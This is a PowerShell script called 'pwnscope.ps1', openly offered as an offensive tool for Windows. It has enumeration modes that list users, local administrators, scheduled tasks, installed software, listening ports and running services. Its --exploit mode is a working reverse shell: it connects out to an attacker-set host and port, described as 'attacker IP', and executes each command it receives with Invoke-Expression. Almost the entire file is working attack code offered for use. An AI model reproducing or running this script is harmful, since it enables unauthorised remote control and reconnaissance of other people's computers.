<#
.SYNOPSIS
    pwnscope.ps1 – Lightweight Windows enumeration & reverse shell script.

.DESCRIPTION
    A PowerShell script for basic enumeration and optional reverse shell backconnect.
    Works on most Windows versions. Run with appropriate permissions.

.PARAMETER --short
    Provides a quick system overview.

.PARAMETER --full
    Provides detailed system information.

.PARAMETER --exploit
    Launches a reverse shell to the IP and port defined via $env:LHOST and $env:LPORT.

.LICENSE
    MIT License © 2025 by suuhm
#>

function Show-ASCIIHeader {
    @"
___________      ________________________________________ 
___  __ \_ | /| / /_  __ \_  ___/  ___/  __ \__  __ \  _ \
__  /_/ /_ |/ |/ /_  / / /(__  )/ /__ / /_/ /_  /_/ /  __/
_  .___/____/|__/ /_/ /_//____/ \___/ \____/_  .___/\___/ 
/_/     pwnshope v0.1a - © 2025 by suuhm    /_/                

"@ | Write-Host -ForegroundColor Cyan
}

function Short-Report {
    Write-Host "`n[*] Basic System Info" -ForegroundColor Yellow
    Write-Host "Hostname: $(hostname)"
    Write-Host "User: $env:USERNAME"
    Write-Host "OS: $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)"
    Write-Host "OS Version: $([System.Environment]::OSVersion.VersionString)"
    Write-Host "Uptime: $([Math]::Round((Get-CimInstance Win32_OperatingSystem).LastBootUpTime.ToUniversalTime().Subtract((Get-Date).ToUniversalTime()).TotalHours * -1, 1)) hours"

    Write-Host "`n[*] IP Configuration"
    Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" } | Format-Table IPAddress, InterfaceAlias

    Write-Host "`n[*] Top 5 Processes by Memory"
    Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5 Name, Id, CPU, WorkingSet | Format-Table
}

function Full-Report {
    Short-Report

    Write-Host "`n[*] Users"
    Get-LocalUser | Format-Table Name, Enabled, LastLogon

    Write-Host "`n[*] Local Admins"
    Get-LocalGroupMember -Group "Administrators" | Select-Object Name, ObjectClass

    Write-Host "`n[*] Scheduled Tasks"
    schtasks /query /fo LIST /v

    Write-Host "`n[*] Installed Programs"
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
        Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize

    Write-Host "`n[*] Network Connections"
    Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" } | Format-Table LocalAddress, LocalPort, OwningProcess

    Write-Host "`n[*] Services Running"
    Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName | Format-Table
}

function Start-ReverseShell {
    if (-not $env:LHOST -or -not $env:LPORT) {
        Write-Host "[!] Please set LHOST and LPORT as environment variables." -ForegroundColor Red
        return
    }

    $client = New-Object System.Net.Sockets.TCPClient($env:LHOST, [int]$env:LPORT)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)

    $writer.AutoFlush = $true
    $writer.WriteLine("Connected from $env:COMPUTERNAME")
    
    while (($cmd = $reader.ReadLine()) -ne "exit") {
        try {
            $output = Invoke-Expression $cmd 2>&1 | Out-String
        } catch {
            $output = $_.Exception.Message
        }
        $writer.WriteLine($output)
        $writer.Flush()
    }

    $client.Close()
}

# ------------------------
# Main
# ------------------------

Show-ASCIIHeader

$Mode = $args[0] # 

switch ($Mode) {
    '--short'   { Short-Report }
    '--full'    { Full-Report }
    '--exploit' { Start-ReverseShell }
    default {
        Write-Host "Usage: .\pwnscope.ps1 [--short | --full | --exploit]" -ForegroundColor Green
        Write-Host "`nEnvironment variables required for --exploit:"
        Write-Host "  - LHOST (attacker IP)"
        Write-Host "  - LPORT (attacker Port)"
    }
}
